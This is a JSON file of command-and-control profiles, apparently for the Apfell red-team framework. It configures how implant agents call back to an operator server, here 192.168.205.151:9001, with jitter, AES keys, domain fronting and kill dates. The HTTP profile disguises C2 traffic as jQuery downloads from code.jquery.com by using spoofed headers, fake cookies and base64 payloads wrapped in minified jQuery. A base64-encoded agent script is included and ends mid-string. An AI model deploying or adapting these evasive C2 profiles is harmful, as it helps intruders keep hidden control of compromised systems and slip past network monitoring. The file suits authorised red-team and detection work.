{
  "profiles": [
    {
      "name": "default",
      "description": "Default RESTful C2 channel",
      "author": "@its_a_feature_",
      "is_p2p": false,
      "is_server_routed": false,
      "params": [
        {
          "name": "Callback host",
          "key": "callback_host",
          "hint": "http(s):\/\/domain.com",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Callback port",
          "key": "callback_port",
          "hint": "80",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Callback interval (in seconds)",
          "key": "callback_interval",
          "hint": "10",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Callback jitter (in percent)",
          "key": "callback_jitter",
          "hint": "23",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Host header (for domain fronting)",
          "key": "domain_front",
          "hint": "",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Encrypted Key Exchange (T/F)",
          "key": "encrypted_exchange_check",
          "hint": "T",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Base64 32byte AES Key",
          "key": "AESPSK",
          "hint": "",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Kill Date",
          "key": "killdate",
          "hint": "yyyy-mm-dd",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "User Agent",
          "key": "USER_AGENT",
          "hint": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
          "randomize": false,
          "format_string": ""
        }
      ],
      "payload_types": [
        {
          "name": "apfell-jxa",
          "files": []
        },
        {
          "name": "poseidon",
          "files": []
        },
        {
          "name": "atlas",
          "files": []
        }
      ],
      "notes": "The 'apfell-jxa' agent cannot connect to self-signed certs, so keep that in mind when standing up infrastructure. \nThis container can be configured and started if you don't want to connect directly to the Apfell server. Otherwise, this container simply acts as a slightly smarter socat redirector.\nWhen starting this container, make sure the \"Config.json\"'s apfellBase parameter matches the protocol (HTTP vs HTTPS) and port for the main Apfell instance.",
      "sampleServer": "",
      "sampleClient": "When setting parameters:\ncallback_host should be 'http://domain.com', 'https://domain.com'.\n'Base64 32byte AES Key' is auto-generated per operation and automatically filled in if the key name is 'AESPSK'. This value must be set for static pre-shared key comms or encrypted key  exchange comms. You can change it to be any base64 of 32 bytes.\nBy default, the payloads will do an encrypted key exchange of some sort"
    },
    {
      "description": "Manipulate HTTP(S) requests and responses",
      "external": false,
      "author": "@its_a_feature_",
      "is_p2p": false,
      "is_server_routed": false,
      "sampleServer": "{\n  \"instances\": [\n  {\n    \"GET\": {\n    \"ServerBody\": [\n      {\n        \"function\": \"base64\",\n        \"parameters\": []\n      },\n      {\n        \"function\": \"prepend\",\n        \"parameters\": [\"!function(e,t){\\\"use strict\\\";\\\"object\\\"==typeof module&&\\\"object\\\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\\\"jQuery requires a window with a document\\\");return t(e)}:t(e)}(\\\"undefined\\\"!=typeof window?window:this,function(e,t){\\\"use strict\\\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\\\"function\\\"==typeof t&&\\\"number\\\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\\\"script\\\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\\\"\\\":\\\"object\\\"==typeof e||\\\"function\\\"==typeof e?l[c.call(e)]||\\\"object\\\":typeof e}var b=\\\"3.3.1\\\",w=function(e,t){return new w.fn.init(e,t)},T=\/^[\\\\s\\\\uFEFF\\\\xA0]+|[\\\\s\\\\uFEFF\\\\xA0]+$\/g;w.fn=w.prototype={jquery:\\\"3.3.1\\\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\\\"boolean\\\"==typeof a&&(l=a,a=arguments[s]||{},s++),\\\"object\\\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\\\"jQuery\\\"+(\\\"3.3.1\\\"+Math.random()).replace(\/\\\\D\/g,\\\"\\\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\\\"[object Object]\\\"!==c.call(e))&&(!(t=i(e))||\\\"function\\\"==typeof(n=f.call(t,\\\"constructor\\\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\\\"\\\":(e+\\\"\\\").replace(T,\\\"\\\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\\\"string\\\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\\\"function\\\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\\\"Boolean Number String Function Array Date RegExp Object Error Symbol\\\".split(\\\" \\\"),function(e,t){l[\\\"[object \\\"+t+\\\"]\\\"]=t.toLowerCase()});function C(e){var t=!!e&&\\\"length\\\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\\\"array\\\"===n||0===t||\\\"number\\\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\\\"sizzle\\\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\\\"\\r\"]\n      },\n      {\n        \"function\": \"prepend\",\n        \"parameters\": [\"\/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org\/license *\/\"]\n      },\n      {\n        \"function\": \"append\",\n        \"parameters\": [\"\\\".(o=t.documentElement,Math.max(t.body[\\\"scroll\\\"+e],o[\\\"scroll\\\"+e],t.body[\\\"offset\\\"+e],o[\\\"offset\\\"+e],o[\\\"client\\\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\\\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\\\".split(\\\" \\\"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\\\"**\\\"):this.off(t,e||\\\"**\\\",n)}}),w.proxy=function(e,t){var n,r,i;if(\\\"string\\\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\\\"number\\\"===t||\\\"string\\\"===t)&&!isNaN(e-parseFloat(e))},\\\"function\\\"==typeof define&&define.amd&&define(\\\"jquery\\\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});\"]\n      }\n    ],\n    \"ServerHeaders\": {\n        \"Server\": \"NetDNA-cache\/2.2\",\n        \"Cache-Control\": \"max-age=0, no-cache\",\n        \"Pragma\": \"no-cache\",\n        \"Connection\": \"keep-alive\",\n        \"Content-Type\": \"application\/javascript; charset=utf-8\"\n      },\n    \"ServerCookies\": {},\n    \"AgentMessage\": [{\n      \"urls\": [\"http:\/\/192.168.205.151:9001\"],\n      \"uri\": \"\/<test:string>\",\n      \"urlFunctions\": [\n        {\n          \"name\": \"<test:string>\",\n          \"value\": \"\",\n          \"transforms\": [\n            {\n              \"function\": \"choose_random\",\n              \"parameters\": [\"jquery-3.3.1.min.js\",\"jquery-3.3.1.map\"]\n            }\n          ]\n        }\n      ],\n      \"AgentHeaders\": {\n        \"Accept\": \"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8\",\n        \"Host\": \"code.jquery.com\",\n        \"Referer\": \"http:\/\/code.jquery.com\/\",\n        \"Accept-Encoding\": \"gzip, deflate\",\n        \"User-Agent\": \"Mozilla\/5.0 (Windows NT 6.3; Trident\/7.0; rv:11.0) like Gecko\"\n      },\n      \"QueryParameters\": [\n          {\n            \"name\": \"q\",\n            \"value\": \"message\",\n            \"transforms\": [\n            ]\n          }\n      ],\n      \"Cookies\": [\n         {\n          \"name\": \"__cfduid\",\n          \"value\": \"\",\n          \"transforms\": [\n            {\n              \"function\": \"random_alpha\",\n              \"parameters\": [30]\n            },\n            {\n              \"function\": \"base64\",\n              \"parameters\": []\n            }\n          ]\n        }\n      ],\n      \"Body\": []\n    }]\n  },\n    \"POST\": {\n    \"ServerBody\": [],\n    \"ServerCookies\": {},\n    \"ServerHeaders\": {\n          \"Server\": \"NetDNA-cache\/2.2\",\n          \"Cache-Control\": \"max-age=0, no-cache\",\n          \"Pragma\": \"no-cache\",\n          \"Connection\": \"keep-alive\",\n          \"Content-Type\": \"application\/javascript; charset=utf-8\"\n        },\n    \"AgentMessage\": [{\n      \"urls\": [\"http:\/\/192.168.205.151:9001\"],\n      \"uri\": \"\/download.php\",\n      \"urlFunctions\": [],\n      \"QueryParameters\": [\n        {\n          \"name\": \"bob2\",\n          \"value\": \"justforvalidation\",\n          \"transforms\": []\n        }\n      ],\n      \"AgentHeaders\": {\n        \"Accept\": \"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8\",\n        \"Host\": \"code.jquery.com\",\n        \"Referer\": \"http:\/\/code.jquery.com\/\",\n        \"Accept-Encoding\": \"gzip, deflate\",\n        \"User-Agent\": \"Mozilla\/5.0 (Windows NT 6.3; Trident\/7.0; rv:11.0) like Gecko\"\n      },\n      \"Cookies\": [\n        {\n          \"name\": \"BobCookie\",\n          \"value\": \"splat\",\n          \"transforms\": [\n            {\n              \"function\": \"prepend\",\n              \"parameters\": [\n                \"splatity_\"\n              ]\n            }\n          ]\n        }\n      ],\n      \"Body\": [\n        {\n          \"function\": \"base64\",\n          \"parameters\": []\n        },\n        {\n          \"function\": \"prepend\",\n          \"parameters\": [\"<html>\"]\n        },\n          {\n          \"function\": \"append\",\n          \"parameters\": [\"<\/html>\"]\n        }\n      ]\n    }]\n  },\n    \"no_match\": {\n      \"action\": \"return_file\",\n      \"redirect\": \"http:\/\/example.com\",\n      \"proxy_get\": {\n        \"url\": \"https:\/\/www.google.com\",\n        \"status\": 200\n      },\n      \"proxy_post\": {\n        \"url\": \"https:\/\/www.example.com\",\n        \"status\": 200\n      },\n      \"return_file\": {\n        \"name\": \"fake.html\",\n        \"status\": 404\n      }\n    },\n    \"port\": 9001,\n    \"key_path\": \"\",\n    \"cert_path\": \"\",\n    \"debug\": true\n    }\n  ],\n  \"apfellBase\": \"http:\/\/localhost\/api\/v1.4\/agent_message\"\n}\n",
      "sampleClient": "{\n  \"GET\": {\n    \"ServerBody\": [\n      {\n        \"function\": \"base64\",\n        \"parameters\": []\n      },\n      {\n        \"function\": \"prepend\",\n        \"parameters\": [\"!function(e,t){\\\"use strict\\\";\\\"object\\\"==typeof module&&\\\"object\\\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\\\"jQuery requires a window with a document\\\");return t(e)}:t(e)}(\\\"undefined\\\"!=typeof window?window:this,function(e,t){\\\"use strict\\\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\\\"function\\\"==typeof t&&\\\"number\\\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\\\"script\\\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\\\"\\\":\\\"object\\\"==typeof e||\\\"function\\\"==typeof e?l[c.call(e)]||\\\"object\\\":typeof e}var b=\\\"3.3.1\\\",w=function(e,t){return new w.fn.init(e,t)},T=\/^[\\\\s\\\\uFEFF\\\\xA0]+|[\\\\s\\\\uFEFF\\\\xA0]+$\/g;w.fn=w.prototype={jquery:\\\"3.3.1\\\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\\\"boolean\\\"==typeof a&&(l=a,a=arguments[s]||{},s++),\\\"object\\\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\\\"jQuery\\\"+(\\\"3.3.1\\\"+Math.random()).replace(\/\\\\D\/g,\\\"\\\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\\\"[object Object]\\\"!==c.call(e))&&(!(t=i(e))||\\\"function\\\"==typeof(n=f.call(t,\\\"constructor\\\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\\\"\\\":(e+\\\"\\\").replace(T,\\\"\\\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\\\"string\\\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\\\"function\\\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\\\"Boolean Number String Function Array Date RegExp Object Error Symbol\\\".split(\\\" \\\"),function(e,t){l[\\\"[object \\\"+t+\\\"]\\\"]=t.toLowerCase()});function C(e){var t=!!e&&\\\"length\\\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\\\"array\\\"===n||0===t||\\\"number\\\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\\\"sizzle\\\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\\\"\\r\"]\n      },\n      {\n        \"function\": \"prepend\",\n        \"parameters\": [\"\/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org\/license *\/\"]\n      },\n      {\n        \"function\": \"append\",\n        \"parameters\": [\"\\\".(o=t.documentElement,Math.max(t.body[\\\"scroll\\\"+e],o[\\\"scroll\\\"+e],t.body[\\\"offset\\\"+e],o[\\\"offset\\\"+e],o[\\\"client\\\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\\\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\\\".split(\\\" \\\"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\\\"**\\\"):this.off(t,e||\\\"**\\\",n)}}),w.proxy=function(e,t){var n,r,i;if(\\\"string\\\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\\\"number\\\"===t||\\\"string\\\"===t)&&!isNaN(e-parseFloat(e))},\\\"function\\\"==typeof define&&define.amd&&define(\\\"jquery\\\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});\"]\n      }\n    ],\n    \"ServerHeaders\": {\n        \"Server\": \"NetDNA-cache\/2.2\",\n        \"Cache-Control\": \"max-age=0, no-cache\",\n        \"Pragma\": \"no-cache\",\n        \"Connection\": \"keep-alive\",\n        \"Content-Type\": \"application\/javascript; charset=utf-8\"\n      },\n    \"ServerCookies\": {},\n    \"AgentMessage\": [{\n      \"urls\": [\"http:\/\/192.168.205.151:9001\"],\n      \"uri\": \"\/<test:string>\",\n      \"urlFunctions\": [\n        {\n          \"name\": \"<test:string>\",\n          \"value\": \"\",\n          \"transforms\": [\n            {\n              \"function\": \"choose_random\",\n              \"parameters\": [\"jquery-3.3.1.min.js\",\"jquery-3.3.1.map\"]\n            }\n          ]\n        }\n      ],\n      \"AgentHeaders\": {\n        \"Accept\": \"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8\",\n        \"Host\": \"code.jquery.com\",\n        \"Referer\": \"http:\/\/code.jquery.com\/\",\n        \"Accept-Encoding\": \"gzip, deflate\",\n        \"User-Agent\": \"Mozilla\/5.0 (Windows NT 6.3; Trident\/7.0; rv:11.0) like Gecko\"\n      },\n      \"QueryParameters\": [\n          {\n            \"name\": \"q\",\n            \"value\": \"message\",\n            \"transforms\": [\n            ]\n          }\n      ],\n      \"Cookies\": [\n         {\n          \"name\": \"__cfduid\",\n          \"value\": \"\",\n          \"transforms\": [\n            {\n              \"function\": \"random_alpha\",\n              \"parameters\": [30]\n            },\n            {\n              \"function\": \"base64\",\n              \"parameters\": []\n            }\n          ]\n        }\n      ],\n      \"Body\": []\n    }]\n  },\n  \"POST\": {\n    \"ServerBody\": [],\n    \"ServerCookies\": {},\n    \"ServerHeaders\": {\n          \"Server\": \"NetDNA-cache\/2.2\",\n          \"Cache-Control\": \"max-age=0, no-cache\",\n          \"Pragma\": \"no-cache\",\n          \"Connection\": \"keep-alive\",\n          \"Content-Type\": \"application\/javascript; charset=utf-8\"\n        },\n    \"AgentMessage\": [{\n      \"urls\": [\"http:\/\/192.168.205.151:9001\"],\n      \"uri\": \"\/download.php\",\n      \"urlFunctions\": [],\n      \"QueryParameters\": [\n        {\n          \"name\": \"bob2\",\n          \"value\": \"justforvalidation\",\n          \"transforms\": []\n        }\n      ],\n      \"AgentHeaders\": {\n        \"Accept\": \"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8\",\n        \"Host\": \"code.jquery.com\",\n        \"Referer\": \"http:\/\/code.jquery.com\/\",\n        \"Accept-Encoding\": \"gzip, deflate\",\n        \"User-Agent\": \"Mozilla\/5.0 (Windows NT 6.3; Trident\/7.0; rv:11.0) like Gecko\"\n      },\n      \"Cookies\": [\n        {\n          \"name\": \"BobCookie\",\n          \"value\": \"splat\",\n          \"transforms\": [\n            {\n              \"function\": \"prepend\",\n              \"parameters\": [\n                \"splatity_\"\n              ]\n            }\n          ]\n        }\n      ],\n      \"Body\": [\n        {\n          \"function\": \"base64\",\n          \"parameters\": []\n        },\n        {\n          \"function\": \"prepend\",\n          \"parameters\": [\"<html>\"]\n        },\n          {\n          \"function\": \"append\",\n          \"parameters\": [\"<\/html>\"]\n        }\n      ]\n    }]\n  },\n  \"jitter\": 50,\n  \"interval\": 10,\n  \"chunk_size\": 5120000,\n  \"key_exchange\": true,\n  \"kill_date\": \"\"\n}\n",
      "notes": "The 'Config.json' file is what configures the 'server' file within the docker container. Be sure to update this to match the port your Apfell server is listening on as well as updating it to match any updates you supply in your agent. You can see a sample agent configuration in `agent_config.json`.",
      "name": "HTTP",
      "icon": null,
      "params": [
        {
          "name": "Base64 32byte AES Key",
          "key": "AESPSK",
          "hint": "",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Agent JSON Config",
          "key": "raw_c2_config",
          "hint": "",
          "randomize": false,
          "format_string": ""
        }
      ],
      "payload_types": [
        {
          "name": "apfell-jxa",
          "files": [
            {
              "HTTP.js": "Ly8tLS0tLS0tLS0tLS0tUkVTVEZVTCBDMiBtZWNoYW5pc21zIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjbGFzcyBjdXN0b21DMiBleHRlbmRzIGJhc2VDMnsKCgljb25zdHJ1Y3RvcihpbnRlcnZhbCwgYmFzZXVybCl7CgkJc3VwZXIoaW50ZXJ2YWwsIGJhc2V1cmwpOwoJCXRoaXMuY29tbWFuZHMgPSBbXTsKCQl0aGlzLmMyX2NvbmZpZyA9IHJhd19jMl9jb25maWc7CgkJdGhpcy5nZXRfbWVzc2FnZXMgPSB0aGlzLmMyX2NvbmZpZ1snR0VUJ11bJ0FnZW50TWVzc2FnZSddOwogICAgICAgIHRoaXMucG9zdF9tZXNzYWdlcyA9IHRoaXMuYzJfY29uZmlnWydQT1NUJ11bJ0FnZW50TWVzc2FnZSddOwogICAgICAgIHRoaXMuaW50ZXJ2YWwgPSB0aGlzLmMyX2NvbmZpZ1snaW50ZXJ2YWwnXTsKICAgICAgICB0aGlzLmNodW5rX3NpemUgPSB0aGlzLmMyX2NvbmZpZ1snY2h1bmtfc2l6ZSddOwogICAgICAgIHRoaXMuaml0dGVyID0gdGhpcy5jMl9jb25maWdbJ2ppdHRlciddOwogICAgICAgIHRoaXMuYWVzX3BzayA9ICJBRVNQU0siOyAvLyBiYXNlNjQgZW5jb2RlZCBrZXkKICAgICAgICBpZih0aGlzLmFlc19wc2sgIT09ICIiKXsKCQkgICAgdGhpcy5wYXJhbWV0ZXJzID0gJC5DRkRpY3Rpb25hcnlDcmVhdGVNdXRhYmxlKCQua0NGQWxsb2NhdG9yRGVmYXVsdCwgMCwgJC5rQ0ZUeXBlRGljdGlvbmFyeUtleUNhbGxCYWNrcywgJC5rQ0ZUeXBlRGljdGlvbmFyeVZhbHVlQ2FsbEJhY2tzKTsKCQkgICAgJC5DRkRpY3Rpb25hcnlTZXRWYWx1ZSh0aGlzLnBhcmFtZXRlcnMsICQua1NlY0F0dHJLZXlUeXBlLCAkLmtTZWNBdHRyS2V5VHlwZUFFUyk7CgkJICAgICQuQ0ZEaWN0aW9uYXJ5U2V0VmFsdWUodGhpcy5wYXJhbWV0ZXJzLCAkLmtTZWNBdHRyS2V5U2l6ZUluQml0cywgJC5rU2VjQUVTMjU2KTsKCQkgICAgJC5DRkRpY3Rpb25hcnlTZXRWYWx1ZSh0aGlzLnBhcmFtZXRlcnMsICQua1NlY0F0dHJLZXlDbGFzcywgJC5rU2VjQXR0cktleUNsYXNzU3ltbWV0cmljKTsKCQkgICAgJC5DRkRpY3Rpb25hcnlTZXRWYWx1ZSh0aGlzLnBhcmFtZXRlcnMsICQua1NlY0NsYXNzLCAkLmtTZWNDbGFzc0tleSk7CiAgICAgICAgICAgIHRoaXMucmF3X2tleSA9ICQuTlNEYXRhLmFsbG9jLmluaXRXaXRoQmFzZTY0RW5jb2RpbmcodGhpcy5hZXNfcHNrKTsKICAgICAgICAgICAgbGV0IGVyciA9IFJlZigpOwogICAgICAgICAgICB0aGlzLmNyeXB0b2tleSA9ICQuU2VjS2V5Q3JlYXRlRnJvbURhdGEodGhpcy5wYXJhbWV0ZXJzLCB0aGlzLnJhd19rZXksIGVycik7CgkJfQogICAgICAgIHRoaXMudXNpbmdfa2V5X2V4Y2hhbmdlID0gdGhpcy5jMl9jb25maWdbJ2tleV9leGNoYW5nZSddOwogICAgICAgIHRoaXMuZXhjaGFuZ2luZ19rZXlzID0gdGhpcy51c2luZ19rZXlfZXhjaGFuZ2U7CiAgICAgICAgdGhpcy5kYXRlRm9ybWF0dGVyID0gJC5OU0RhdGVGb3JtYXR0ZXIuYWxsb2MuaW5pdDsKICAgICAgICB0aGlzLmRhdGVGb3JtYXR0ZXIuc2V0RGF0ZUZvcm1hdCgieXl5eS1NTS1kZCIpOwogICAgICAgIGlmKHRoaXMuYzJfY29uZmlnWydraWxsX2RhdGUnXSAhPT0gdW5kZWZpbmVkICYmIHRoaXMuYzJfY29uZmlnWydraWxsX2RhdGUnXSAhPT0gIiIpewogICAgICAgICAgICB0aGlzLmtpbGxfZGF0ZSA9IHRoaXMuZGF0ZUZvcm1hdHRlci5kYXRlRnJvbVN0cmluZyh0aGlzLmMyX2NvbmZpZ1sna2lsbF9kYXRlJ10pOwogICAgICAgIH1lbHNlewogICAgICAgICAgICB0aGlzLmtpbGxfZGF0ZSA9ICQuTlNEYXRlLmRpc3RhbnRGdXR1cmU7CiAgICAgICAgfQoJfQogICAgZ2V0X3JhbmRvbV9lbGVtZW50KHgpewoJICAgIHJldHVybiB4W01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIHgubGVuZ3RoKV07CiAgICB9CgllbmNyeXB0X21lc3NhZ2UodWlkLCBkYXRhKXsKCSAgICAvLyB0YWtlcyBpbiB0aGUgc3RyaW5nIHdlJ3JlIGFib3V0IHRvIHNlbmQsIGVuY3J5cHRzIGl0LCBhbmQgcmV0dXJucyBhIG5ldyBzdHJpbmcKCSAgICBsZXQgZXJyID0gUmVmKCk7CgkgICAgbGV0IGVuY3J5cHQgPSAkLlNlY0VuY3J5cHRUcmFuc2Zvcm1DcmVhdGUodGhpcy5jcnlwdG9rZXksZXJyKTsKCSAgICBsZXQgYiA9ICQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGVuY3J5cHQsICQoIlNlY1BhZGRpbmdLZXkiKSwgJCgiU2VjUGFkZGluZ1BLQ1M3S2V5IiksIGVycik7CgkgICAgYj0gJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZW5jcnlwdCwgJCgiU2VjRW5jcn